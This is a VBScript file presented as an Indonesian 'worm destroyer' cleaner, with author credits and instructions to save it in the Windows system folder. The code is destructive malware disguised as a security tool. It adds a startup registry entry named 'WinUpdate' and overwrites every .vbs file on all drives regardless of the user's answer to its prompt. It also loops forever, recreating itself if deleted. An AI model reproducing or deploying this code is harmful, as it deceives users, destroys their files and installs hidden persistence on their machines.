'w0rm pemusnah w0rm (WPW 1.1)
'
'coderz by N0:7
'http://www.geocities.com/sevenC_zone
'http://trax.to/sevenC
'mailto:seven@punk.ass
'------------------------------------------------------
'save this file as vbs on C:\windows\system\
'SIMPAN FILE INI PADA DIREKTOR C:\WINDOWS\SYSTEM

Set seven = createobject("scripting.filesystemobject")
diana = seven.getspecialfolder(0)
fadly = diana & "\system\seven.vbs"
Set alfahrie = createobject("wscript.shell")
alfahrie.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & fadly & " %"
seven.copyfile wscript.scriptfullname, fadly

Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set Fso = createobject("scripting.filesystemobject") 
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive
end If 
Next 
  
Function Dosearch(Path) 
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files
If fso.GetExtensionName(file.path)="vbs" then 
on error resume next
set drop = fso.createtextfile(File.path)
msgbox "I found file like an w0rm at " & Chr(34) & file.path & Chr(34) & "  Should I kill the script of file ?",vbOkCancel
if vbOk then
drop.writeline "cleaned by WPW1.1 [N0:7]"
drop.writeline "Please to delete this file"
drop.close
msgbox " the script has been cleaned please delete it manualy "
else
msgbox "You choose to not delete the script , please check this manualy "
end if
end if
next

Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function 


set fso = createobject("scripting.filesystemobject")
set myself = fso.opentextfile(wscript.scriptfullname)
mytext = myself.readall
myself.close
do
if fso.fileexists(wscript.scriptfullname) = false then
set myself = fso.createtextfile(wscript.scriptfullname)
myself.write mytext
myself.close 
end if
loop 

'ENGLISH : SAVE THIS FILE AS VBS AT C:\WINDOWS\SYSTEM\
'INDONESIA : SIMPAN FILE INI DI DIREKTORI C:\WINDOWS\SYSTEM\
'Anda bisa download WPW terbaru seri 1.2 di http://trax.to/sevenC
'codez by N0:7